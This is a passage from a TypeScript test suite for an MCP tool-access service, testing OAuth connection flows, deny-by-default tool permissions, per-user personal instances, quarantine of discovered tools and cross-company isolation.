      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      });
      expect(new URL(start.authorizationUrl).origin).toBe("http://127.0.0.1:8930");

      // Same connection, same discovered endpoint, authenticated public
      // deployment: the local-development exception no longer applies.
      await db.delete(toolOauthStates);
      const publicService = toolAccessService(db, {
        deploymentMode: "authenticated",
        deploymentExposure: "public",
      });
      await expect(publicService.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      })).rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
    });
  });

  it("rejects a private-network endpoint in an authenticated public deployment", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db, {
      deploymentMode: "authenticated",
      deploymentExposure: "public",
    });

    await expect(service.connectGalleryApp(company.id, {
      link: "http://127.0.0.1:8848/mcp",
      name: "Fixture loopback",
    })).rejects.toMatchObject({ details: { code: "remote_http_private_endpoint" } });
    await expect(db.select().from(toolConnections)).resolves.toHaveLength(0);
  });

  it("keeps generic connections inside their own company", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const owner = await createCompany(db);
    const other = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(owner.id, { link: MCP_URL, name: "Fixture scoped" });

    await expect(service.getConnection(connected.connectionId, other.id)).rejects.toMatchObject({ status: 404 });
    await expect(service.startOAuth(other.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({ status: 404 });
  });

  it("gives a generic connection the same review, access, install, gateway and revoke path", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const policy = toolAccessPolicyService(db);
    const [agent, outsideAgent] = await db.insert(agents).values([
      {
        companyId: company.id,
        name: `Generic MCP agent ${randomUUID()}`,
        role: "engineer",
        status: "active",
        adapterType: "process",
        adapterConfig: {},
        runtimeConfig: {},
      },
      {
        companyId: company.id,
        name: `Outside MCP agent ${randomUUID()}`,
        role: "engineer",
        status: "active",
        adapterType: "process",
        adapterConfig: {},
        runtimeConfig: {},
      },
    ]).returning();

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture governance" });
    const readEntry = connected.catalog.find((entry) => entry.toolName === "list_insights")!;
    const writeEntry = connected.catalog.find((entry) => entry.toolName === "create_insight")!;

    // Action selection: enable the read, leave the state-changing action off.
    const finished = await service.finishGalleryAppConnection(company.id, connected.connectionId, {
      enabledCatalogEntryIds: [readEntry.id],
      askFirstCatalogEntryIds: [],
      access: { agentIds: [agent!.id] },
    }, { actorType: "user", actorId: "board-user" });

    expect(finished.connection).toMatchObject({ status: "active", enabled: true });
    expect(finished.profile).toMatchObject({ profileKey: `app:${connected.connectionId}`, defaultAction: "deny" });
    expect(finished.profileBindings).toEqual([
      expect.objectContaining({ targetType: "agent", targetId: agent!.id }),
    ]);

    const decisionInput = (catalogEntryId: string, toolName: string, agentId = agent!.id) => ({
      companyId: company.id,
      actor: { actorType: "agent" as const, actorId: agentId, agentId },
      request: { connectionId: connected.connectionId, catalogEntryId, toolName },
    });

    // Action selection is what the app profile encodes: the enabled read is
    // allowed for the chosen agent, and the state-changing action the operator
    // left off is denied by the profile's `deny` default.
    await expect(policy.decide(decisionInput(readEntry.id, "list_insights")))
      .resolves.toMatchObject({ allowed: true, reasonCode: "allow_profile" });
    await expect(policy.decide(decisionInput(writeEntry.id, "create_insight")))
      .resolves.toMatchObject({ allowed: false, reasonCode: "deny_default" });
    await expect(policy.decide(decisionInput(readEntry.id, "list_insights", outsideAgent!.id)))
      .resolves.toMatchObject({ allowed: false, reasonCode: "deny_default" });

    // Simulate a profile written by the legacy install path. Saving installs
    // must self-heal this over-broad entry as well as avoiding it for new apps.
    await db.insert(toolProfileEntries).values({
      companyId: company.id,
      profileId: finished.profile.id,
      selectorType: "connection",
      effect: "include",
      applicationId: connected.connection.applicationId,
      connectionId: connected.connectionId,
    });

    // Installation targets the chosen agent, same as a curated connection.
    await service.putConnectionInstalls(connected.connectionId, {
      installs: [{ targetType: "agent", targetId: agent!.id, enabled: true }],
    }, { actorType: "user", actorId: "board-user" });
    const installs = await db.select().from(toolConnectionInstalls)
      .where(eq(toolConnectionInstalls.connectionId, connected.connectionId));
    expect(installs).toEqual([expect.objectContaining({ targetType: "agent", targetId: agent!.id })]);
    const installedProfileEntries = await db.select().from(toolProfileEntries)
      .where(eq(toolProfileEntries.profileId, finished.profile.id));
    expect(installedProfileEntries).not.toEqual(expect.arrayContaining([
      expect.objectContaining({
        selectorType: "connection",
        connectionId: connected.connectionId,
        effect: "include",
      }),
    ]));
    await expect(policy.decide(decisionInput(readEntry.id, "list_insights")))
      .resolves.toMatchObject({ allowed: true, reasonCode: "allow_profile" });
    await expect(policy.decide(decisionInput(writeEntry.id, "create_insight")))
      .resolves.toMatchObject({ allowed: false, reasonCode: "deny_default" });

    // Revoke: archiving the connection removes access but keeps the trail.
    await service.archiveConnection(connected.connectionId, company.id);
    const afterRevoke = await policy.decide(decisionInput(readEntry.id, "list_insights"));
    expect(afterRevoke.allowed).toBe(false);

    const auditEvents = await db.select().from(toolAccessAuditEvents)
      .where(eq(toolAccessAuditEvents.companyId, company.id));
    expect(auditEvents.length).toBeGreaterThan(0);
  });

  /**
   * The help prompt tells an agent exactly what JSON shape to return. Prove that
   * shape survives the real preview parser, using the example lifted out of the
   * prompt itself rather than a hand-copied duplicate — otherwise the prompt and
   * the parser can drift and only an operator would find out.
   */
  it("parses the JSON shape the help prompt asks an agent for", async () => {
    const service = toolAccessService(db);
    const jsonBlock = MCP_CONFIG_HELP_PROMPT.slice(
      MCP_CONFIG_HELP_PROMPT.indexOf("{"),
      MCP_CONFIG_HELP_PROMPT.lastIndexOf("}") + 1,
    );
    // Sanity-check the extraction before relying on it.
    expect(() => JSON.parse(jsonBlock)).not.toThrow();

    const preview = await service.previewMcpJsonImport({ mcpJson: jsonBlock });

    expect(preview.drafts).toHaveLength(1);
    expect(preview.drafts[0]).toMatchObject({ transport: "mcp_remote" });
    expect(preview.drafts[0]!.config).toMatchObject({ url: "https://mcp.example.com/mcp" });
    // The placeholder header name comes through as a field to ask the operator
    // for, which is exactly what the prompt promises will happen.
    expect(preview.drafts[0]!.credentialFields.map((field) => field.configPath))
      .toContain("headers.Authorization");
  });

  it("serves a client metadata document with no company or secret data", async () => {
    const company = await createCompany(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body).toMatchObject({
      client_id: CLIENT_METADATA_DOCUMENT_URL,
      redirect_uris: [REDIRECT_URI],
      token_endpoint_auth_method: "none",
      application_type: "web",
    });
    expect(JSON.stringify(response.body)).not.toContain(company.id);
  });

  it("uses the configured auth origin for self-hosted OAuth callbacks", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", "https://public.paperclip.example");
    vi.stubEnv("PAPERCLIP_AUTH_PUBLIC_BASE_URL", "https://auth.paperclip.example");
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body.redirect_uris).toEqual([
      "https://auth.paperclip.example/api/tools/oauth/callback",
    ]);
  });

  it("uses the managed runtime origin when no explicit callback origin is configured", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", "");
    vi.stubEnv("PAPERCLIP_AUTH_PUBLIC_BASE_URL", "");
    vi.stubEnv("BETTER_AUTH_URL", "");
    vi.stubEnv("BETTER_AUTH_BASE_URL", "");
    vi.stubEnv("PAPERCLIP_MANAGED_RUNTIME_PUBLIC_URL", "https://worktree.tail29c1aa.ts.net");
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body.redirect_uris).toEqual([
      "https://worktree.tail29c1aa.ts.net/api/tools/oauth/callback",
    ]);
  });

  it("keeps an explicit callback origin ahead of managed runtime inference", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    vi.stubEnv("PAPERCLIP_MANAGED_RUNTIME_PUBLIC_URL", "https://inferred.tail29c1aa.ts.net");
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body.redirect_uris).toEqual([REDIRECT_URI]);
  });

  // ---- TECH-7340: discovery-only OAuth seeds and strict personal instances --------------------

  describe("TECH-7340: seed connect-as-yourself, personal instances, and the OAuth callback", () => {
    const GOOGLE_URL_ENV = "PAPERCLIP_DEFAULT_MCP_RH_GOOGLE_MCP_URL";
    const RH_URL_ENV = "PAPERCLIP_DEFAULT_MCP_RH_MCP_URL";
    const GOOGLE_TOOLS = [
      { name: "gmail_search", description: "Search mail", annotations: { readOnlyHint: true } },
      { name: "gmail_send", description: "Send mail", annotations: { readOnlyHint: false } },
    ];
    // These five Granola read tools are within the rh-mcp read ceiling; the rest of this fixture's
    // tools are beyond it. The real ceiling (server/src/services/default-mcp-spec.ts) is 10 raw
    // names — this fixture's simulated upstream only ever discovers these five of them, so it
    // never exercises argus_get_proxy_token or the Zoom read tools; see tool-gateway.ts's
    // agentReadCeilingForConnection unit coverage in default-mcp-spec.test.ts for those.
    const RH_CEILING_TOOLS = [
      "mdm_granola_status",
      "mdm_list_my_granola_notes",
      "mdm_list_shared_granola_notes",
      "mdm_get_granola_note",
      "mdm_get_granola_transcript",
    ];
    const RH_ALL_TOOLS = [
      ...RH_CEILING_TOOLS.map((name) => ({ name, description: name, annotations: { readOnlyHint: true } })),
      { name: "mdm_erase_granola_note", description: "Erase a note", annotations: { readOnlyHint: false } },
      { name: "mdm_write_annotation", description: "Write an annotation", annotations: { readOnlyHint: false } },
      { name: "mdm_search_concepts", description: "Search concepts", annotations: { readOnlyHint: true } },
    ];

    /**
     * Seeds both discovery-only entries against the in-process fixture endpoint
     * (the public-IP-literal MCP URL keeps host dispatch deterministic, no DNS),
     * and pins the live process environment the seed-start route's pre-checks
     * read (flag, rollout scope, configured endpoints).
     */
    async function seedOauthSeeds(companyId: string) {
      vi.stubEnv(DEFAULT_MCP_SPEC_ENABLED_ENV, "true");
      vi.stubEnv(GOOGLE_URL_ENV, MCP_URL);
      vi.stubEnv(RH_URL_ENV, MCP_URL);
      __resetDefaultMcpTemplateScopeForTests();
      captureDefaultMcpTemplateScope({}); // unset allowlist -> every company
      await ensureCompanyDefaultMcpOAuthSeeds(
        {
          db,
          scope: { mode: "all" },
          env: {
            [DEFAULT_MCP_SPEC_ENABLED_ENV]: "true",
            [GOOGLE_URL_ENV]: MCP_URL,
            [RH_URL_ENV]: MCP_URL,
          } as unknown as NodeJS.ProcessEnv,
        },
        { companyId },
      );
    }

    async function addHumanMember(
      companyId: string,
      opts: { role?: string; status?: string } = {},
    ) {
      const userId = `user-${randomUUID()}`;
      const now = new Date();
      await db.insert(authUsers).values({
        id: userId,
        name: "Human Member",
        email: `${userId}@redesignhealth.com`,
        emailVerified: true,
        createdAt: now,
        updatedAt: now,
      });
      await db.insert(companyMemberships).values({
        companyId,
        principalType: "user",
        principalId: userId,
        status: opts.status ?? "active",
        membershipRole: opts.role ?? "member",
        createdAt: now,
      });
      return userId;
    }

    type SessionActor = Record<string, unknown> & { userId: string };
    function sessionActor(
      companyId: string,
      userId: string,
      opts: { role?: string; status?: string; companyIds?: string[] } = {},
    ): SessionActor {
      return {
        type: "board",
        userId,
        userName: "Human Member",
        userEmail: null,
        isInstanceAdmin: false,
        source: "session",
        sessionId: `session-${userId}`,
        companyIds: opts.companyIds ?? [companyId],
        memberships: [{ companyId, status: opts.status ?? "active", membershipRole: opts.role ?? "member" }],
      };
    }

    function createActorApp(actor: Record<string, unknown>) {
      const app = express();
      app.use(express.json());
      app.use((req, _res, next) => {
        req.actor = actor as never;
        next();
      });
      app.use("/api", toolAccessRoutes(db));
      app.use(errorHandler);
      return app;
    }

    const seedByUid = async (companyId: string, uid: string) => {
      const [row] = await db
        .select()
        .from(toolConnections)
        .where(and(eq(toolConnections.companyId, companyId), eq(toolConnections.uid, uid)));
      return row ?? null;
    };
    const googleSeed = (companyId: string) => seedByUid(companyId, "rh-google-mcp/default-mcp-seed");
    const rhSeed = (companyId: string) => seedByUid(companyId, "rh-mcp-personal/default-mcp-seed");

    function stubPublicUrl() {
      vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    }

    async function startSeedConnect(
      companyId: string,
      seedId: string,
      userId: string,
      opts: { body?: Record<string, unknown>; role?: string; status?: string; companyIds?: string[] } = {},
    ) {
      stubPublicUrl();
      const app = createActorApp(
        sessionActor(companyId, userId, {
          role: opts.role,
          status: opts.status,
          ...(opts.companyIds ? { companyIds: opts.companyIds } : {}),
        }),
      );
      const response = await request(app)
        .post(`/api/tools/oauth/${seedId}/start`)
        .send({ asCurrentUser: true, ...(opts.body ?? {}) });
      return response;
    }

    async function completeSeedConnect(
      companyId: string,
      userId: string,
      startUrl: string,
      fixture: ReturnType<typeof installMcpOAuthFixture>,
      opts: { role?: string; status?: string } = {},
    ) {
      stubPublicUrl();
      const app = createActorApp(sessionActor(companyId, userId, { role: opts.role, status: opts.status }));
      const code = fixture.issueAuthorizationCode(startUrl);
      const state = new URL(startUrl).searchParams.get("state")!;
      return request(app).get(`/api/tools/oauth/callback?state=${encodeURIComponent(state)}&code=${encodeURIComponent(code)}`);
    }

    const grantsOf = (connectionId: string) =>
      db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, connectionId));
    const catalogOf = (connectionId: string) =>
      db.select().from(toolCatalogEntries).where(eq(toolCatalogEntries.connectionId, connectionId));
    const installsOf = (connectionId: string) =>
      db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, connectionId));

    it("the seed start route requires connecting as a signed-in human member; nobody else gets an instance", async () => {
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const member = await addHumanMember(company.id);

      stubPublicUrl();
      const agentApp = createActorApp({
        type: "agent", agentId: randomUUID(), companyId: company.id, source: "agent_key", keyId: null, runId: null,
      });
      // A non-human actor: no userId, refused 403 whether or not it claims asCurrentUser.
      await request(agentApp).post(`/api/tools/oauth/${seed.id}/start`).send({}).expect(403);
      await request(agentApp).post(`/api/tools/oauth/${seed.id}/start`).send({ asCurrentUser: true }).expect(403);
      // A signed-in human who did not opt into connect-as-yourself is refused 403.
      const humanApp = createActorApp(sessionActor(company.id, member));
      await request(humanApp).post(`/api/tools/oauth/${seed.id}/start`).send({}).expect(403);
      // A viewer is refused 403 (read-only role).
      const viewer = await addHumanMember(company.id, { role: "viewer" });
      expect((await startSeedConnect(company.id, seed.id, viewer, { role: "viewer" })).status).toBe(403);
      // A suspended member is refused 403.
      const suspended = await addHumanMember(company.id);
      await db.update(companyMemberships)
        .set({ status: "suspended" })
        .where(and(eq(companyMemberships.companyId, company.id), eq(companyMemberships.principalId, suspended)));
      expect((await startSeedConnect(company.id, seed.id, suspended, { status: "suspended" })).status).toBe(403);
      // A member of another company cannot even see the seed (404, no existence oracle).
      const foreigner = await addHumanMember(company.id);
      expect((await startSeedConnect(company.id, seed.id, foreigner, { companyIds: [randomUUID()] })).status).toBe(404);

      // Nobody created a personal instance (the seed itself is the only "RH Google MCP" row).
      const instanceRows = await db
        .select({ id: toolConnections.id, uid: toolConnections.uid, createdByUserId: toolConnections.createdByUserId })
        .from(toolConnections)
        .where(eq(toolConnections.companyId, company.id));
      const personalInstances = instanceRows.filter((row) => row.uid.startsWith("rh-google-mcp/default-mcp-personal/"));
      expect(personalInstances).toHaveLength(0);
      expect(instanceRows.filter((row) => row.createdByUserId !== null)).toHaveLength(0);
    });

    it("a signed-in human connects through the seed into their own instance; consent lands only on that instance", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);
      const bob = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      expect(start.status).toBe(200);
      const aliceInstanceId = start.body.connectionId as string;
      expect(aliceInstanceId).not.toBe(seed.id);
      expect(typeof start.body.authorizationUrl).toBe("string");

      const aliceInstance = (await db.select().from(toolConnections).where(eq(toolConnections.id, aliceInstanceId)))[0]!;
      expect(aliceInstance).toMatchObject({
        uid: `rh-google-mcp/default-mcp-personal/${alice}`,
        createdByUserId: alice,
        status: "draft",
        enabled: false,
      });
      void bob;

      const callback = await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);
      expect(callback.body.connection).toMatchObject({ id: aliceInstanceId, status: "active", enabled: true });

      // The consent produced exactly one USER grant, on the instance, for Alice.
      expect(await grantsOf(aliceInstanceId)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: alice, status: "active" }),
      ]);
      expect(await grantsOf(seed.id)).toHaveLength(0);
      // No company install, no organization grant, no profile entry or binding of any target.
      expect(await installsOf(aliceInstanceId)).toHaveLength(0);
      expect(await db.select().from(toolProfileEntries).where(eq(toolProfileEntries.companyId, company.id))).toHaveLength(0);
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toHaveLength(0);
      // The seed itself is untouched: still draft, still disabled, no catalog, no OAuth state.
      const seedAfter = (await googleSeed(company.id))!;
      expect(seedAfter).toMatchObject({ status: "draft", enabled: false });
      expect(await catalogOf(seed.id)).toHaveLength(0);

    });

    it("a second human in the same company connects independently: their own instance and their own grant (not first-person-owns-org)", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);
      const bob = await addHumanMember(company.id);

      const aliceStart = await startSeedConnect(company.id, seed.id, alice);
      expect(aliceStart.status).toBe(200);
      const aliceInstanceId = aliceStart.body.connectionId as string;
      expect((await completeSeedConnect(company.id, alice, aliceStart.body.authorizationUrl, fixture)).status).toBe(200);

      // B is not blocked by A's existing instance: B's Connect creates B's own row.
      const bobStart = await startSeedConnect(company.id, seed.id, bob);
      expect(bobStart.status).toBe(200);
      const bobInstanceId = bobStart.body.connectionId as string;
      expect(bobInstanceId).not.toBe(aliceInstanceId);
      const bobInstance = (await db.select().from(toolConnections).where(eq(toolConnections.id, bobInstanceId)))[0]!;
      expect(bobInstance.createdByUserId).toBe(bob);

      // B's own consent completes on B's instance; A's grant is untouched.
      const bobCallback = await completeSeedConnect(company.id, bob, bobStart.body.authorizationUrl, fixture);
      expect(bobCallback.status).toBe(200);
      expect(await grantsOf(bobInstanceId)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: bob }),
      ]);
      expect(await grantsOf(aliceInstanceId)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: alice }),
      ]);
    });

    it("a brand-new Google instance consent leaves every discovered tool quarantined until the owner reviews it", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      const callback = await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);
      const instanceId = start.body.connectionId as string;

      const catalog = await catalogOf(instanceId);
      expect(catalog.map((entry) => entry.toolName).sort()).toEqual(["gmail_search", "gmail_send"]);
      // NOTHING was auto-enabled: every tool (read or write) is quarantined with no review stamp.
      for (const entry of catalog) {
        expect(entry.status).toBe("quarantined");
        expect(entry.reviewedAt).toBeNull();
      }
      // Access is empty until the explicit owner review: no enabled action, no profile
      // entry, and no binding of any target (an empty deny-by-default profile row is fine).
      const profileRows = await db
        .select()
        .from(toolProfiles)
        .where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${instanceId}`)));
      for (const profile of profileRows) {
        expect(await db.select().from(toolProfileEntries).where(eq(toolProfileEntries.profileId, profile.id))).toHaveLength(0);
      }
      expect(await db.select().from(toolProfileEntries).where(eq(toolProfileEntries.companyId, company.id))).toHaveLength(0);
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toHaveLength(0);
    });

    it("COUNTEREXAMPLE (guard-all-producer-paths, route level): a connection manager cannot finish/review someone else's personal instance", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      const callback = await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);
      const instanceId = start.body.connectionId as string;
      const catalog = await catalogOf(instanceId);
      expect(catalog.every((entry) => entry.status === "quarantined")).toBe(true);

      // "board-user" is the company admin (and the deployment's instance admin): the finish
      // route's creator-or-manager gate lets it through. The service must still refuse a
      // non-owner finish: approving Alice's quarantined tools and binding the whole company
      // is exactly what putConnectionInstalls already refuses with personal_instance_owner_required.
      stubPublicUrl();
      const managerApp = createActorApp({
        type: "board",
        userId: "board-user",
        userName: "Board User",
        userEmail: null,
        isInstanceAdmin: true,
        source: "local_implicit",
        companyIds: [company.id],
        memberships: [{ companyId: company.id, status: "active", membershipRole: "admin" }],
      });
      const finish = await request(managerApp)
        .post(`/api/companies/${company.id}/tools/apps/${instanceId}/finish`)
        .send({
          enabledCatalogEntryIds: [],
          askFirstCatalogEntryIds: [],
          reviewedCatalogEntryIds: catalog.map((entry) => entry.id),
          access: "all_agents",
        });
      expect([403, 409, 422]).toContain(finish.status);
      expect(finish.status).not.toBe(200);
      // The internal trusted/expectNewProfile context is server-only: a public body
      // forging it (or a personal subject) cannot unlock someone else's instance.
      const forged = await request(managerApp)
        .post(`/api/companies/${company.id}/tools/apps/${instanceId}/finish`)
        .send({
          enabledCatalogEntryIds: [],
          askFirstCatalogEntryIds: [],
          reviewedCatalogEntryIds: catalog.map((entry) => entry.id),
          access: "all_agents",
          trusted: { personalSubjectUserId: "board-user", expectNewProfile: false },
        });
      expect(forged.status).not.toBe(200);
      expect(forged.body.details).toMatchObject({ code: "personal_instance_owner_required" });
      // And nothing was enabled or bound regardless of the guard's shape.
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toHaveLength(0);
      expect((await catalogOf(instanceId)).every((entry) => entry.status === "quarantined")).toBe(true);
      expect((await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!.status).toBe("active");
    });

    it("the owner's own finish review enables exactly the chosen tools; a later catalog refresh preserves the review and adds no company binding", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const [agent] = await db.insert(agents).values({
        companyId: company.id, name: "Owner review target", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
      }).returning();
      const start = await startSeedConnect(company.id, seed.id, alice);
      const instanceId = start.body.connectionId as string;
      const callback = await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);
      const catalog = await catalogOf(instanceId);
      const search = catalog.find((entry) => entry.toolName === "gmail_search")!;
      const send = catalog.find((entry) => entry.toolName === "gmail_send")!;

      // The owner's explicit review: approving the quarantined tools, but ENABLED
      // (permitted for the agent) is only the read tool — the write tool stays out of the profile.
      stubPublicUrl();
      const aliceApp = createActorApp(sessionActor(company.id, alice));
      const finish = await request(aliceApp)
        .post(`/api/companies/${company.id}/tools/apps/${instanceId}/finish`)
        .send({
          enabledCatalogEntryIds: [search.id],
          askFirstCatalogEntryIds: [],
          reviewedCatalogEntryIds: [search.id, send.id],
          access: { agentIds: [agent!.id] },
        });
      expect(finish.status).toBe(200);
      const profileEntriesAfterFinish = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.companyId, company.id));
      expect(profileEntriesAfterFinish.map((entry) => entry.catalogEntryId)).toEqual([search.id]);
      expect(finish.body.profileBindings).toEqual([
        expect.objectContaining({ targetType: "agent", targetId: agent!.id }),
      ]);

      // A later catalog refresh (same tools) preserves the owner's reviewed choices (no
      // re-quarantine of the reviewed entries) and manufactures no company-wide install,
      // profile entry, or binding for the personal instance.
      const refresh = await request(aliceApp).post(`/api/tool-connections/${instanceId}/catalog/refresh`).send({});
      expect(refresh.status).toBe(200);
      const statusesAfterRefresh = (await catalogOf(instanceId))
        .map((entry) => [entry.toolName, entry.status])
        .sort();
      expect(statusesAfterRefresh).toEqual([
        ["gmail_search", "active"],
        ["gmail_send", "active"],
      ]);
      const profileEntriesAfterRefresh = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.companyId, company.id));
      expect(profileEntriesAfterRefresh.map((entry) => entry.catalogEntryId)).toEqual([search.id]);
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toHaveLength(1); // the owner's agent binding only
      expect(await installsOf(instanceId)).toHaveLength(0);
      // No company install appears either.
      expect(await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.companyId, company.id))).toHaveLength(0);
    });

    it("a brand-new RH instance consent activates exactly the five Granola read tools; everything beyond the ceiling stays quarantined", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_ALL_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await rhSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      expect(start.status).toBe(200);
      const instanceId = start.body.connectionId as string;

      // Pre-insert a historical catalog entry for this connection that is NOT in current fixture tools.
      // S1/S2 regression: this historical row must NOT appear in callback.body.catalog or callback.body.actions,
      // while remaining stored in the database.
      const [historicalEntry] = await db
        .insert(toolCatalogEntries)
        .values({
          companyId: company.id,
          applicationId: seed.applicationId,
          connectionId: instanceId,
          entryKind: "tool",
          name: "old_server_removed_tool",
          toolName: "old_server_removed_tool",
          title: "Old Server Removed Tool",
          riskLevel: "read",
          isReadOnly: true,
          status: "quarantined",
          versionHash: randomUUID(),
          schemaHash: randomUUID(),
        })
        .returning();

      const callback = await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);

      const callbackBody = callback.body as {
        catalog: ToolCatalogEntry[];
        actions: { readOnly: { toolName: string }[]; canMakeChanges: { toolName: string }[] };
      };
      const responseCatalog = callbackBody.catalog;
      expect(responseCatalog).toHaveLength(RH_ALL_TOOLS.length);
      expect(responseCatalog.map((e) => e.toolName)).not.toContain("old_server_removed_tool");
      expect(callbackBody.actions.readOnly.map((a) => a.toolName)).not.toContain("old_server_removed_tool");
      expect(callbackBody.actions.canMakeChanges.map((a) => a.toolName)).not.toContain("old_server_removed_tool");

      // The historical row remains stored in DB (no deleting stored records)
      const storedHistorical = await db
        .select()
        .from(toolCatalogEntries)
        .where(eq(toolCatalogEntries.id, historicalEntry!.id));
      expect(storedHistorical).toHaveLength(1);

      const responseByName = new Map(responseCatalog.map((entry) => [entry.toolName, entry]));
      for (const name of RH_CEILING_TOOLS) {
        expect(responseByName.get(name)!.status).toBe("active");
        expect(responseByName.get(name)!.reviewedAt).not.toBeNull();
      }
      for (const name of ["mdm_erase_granola_note", "mdm_write_annotation", "mdm_search_concepts"]) {
        expect(responseByName.get(name)!.status).toBe("quarantined");
        expect(responseByName.get(name)!.reviewedAt).toBeNull();
      }

      const catalog = await catalogOf(instanceId);
      expect(catalog).toHaveLength(RH_ALL_TOOLS.length + 1);
      const byName = new Map(catalog.map((entry) => [entry.toolName, entry]));
      for (const name of RH_CEILING_TOOLS) {
        expect(byName.get(name)!.status).toBe("active");
        expect(byName.get(name)!.reviewedAt).not.toBeNull();
      }
      // Every non-ceiling tool — erase, write, even a read-only search — stays quarantined.
      for (const name of ["mdm_erase_granola_note", "mdm_write_annotation", "mdm_search_concepts"]) {
        expect(byName.get(name)!.status).toBe("quarantined");
        expect(byName.get(name)!.reviewedAt).toBeNull();
      }
      // The rh-mcp spec entry's read ceiling is broader than this fixture's simulated upstream
      // (which only discovers the five Granola tools); the ceiling itself is a fixed 10 raw names.
      const instanceRow = (await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!;
      expect(agentReadCeilingForConnection(instanceRow)?.size).toBe(10);
      expect(agentMayUseConnectionTool(instanceRow, "mdm_erase_granola_note")).toBe(false);
      expect(agentMayUseConnectionTool(instanceRow, "mdm_get_granola_note")).toBe(true);
      // S5+S6: the brand-new profile is initialized (once, under the finish transaction) with
      // EXACTLY the five ceiling tools as its entries — nothing beyond the ceiling.
      const brandNewProfile = await db
        .select()
        .from(toolProfiles)
        .where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${instanceId}`)));
      expect(brandNewProfile).toHaveLength(1);
      const brandNewEntries = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.profileId, brandNewProfile[0]!.id));
      expect(brandNewEntries).toHaveLength(5);
      expect(brandNewEntries.map((entry) => entry.catalogEntryId).sort()).toEqual(
        catalog.filter((entry) => RH_CEILING_TOOLS.includes(entry.toolName)).map((entry) => entry.id).sort(),
      );
      // No company install or binding was created by the consent.
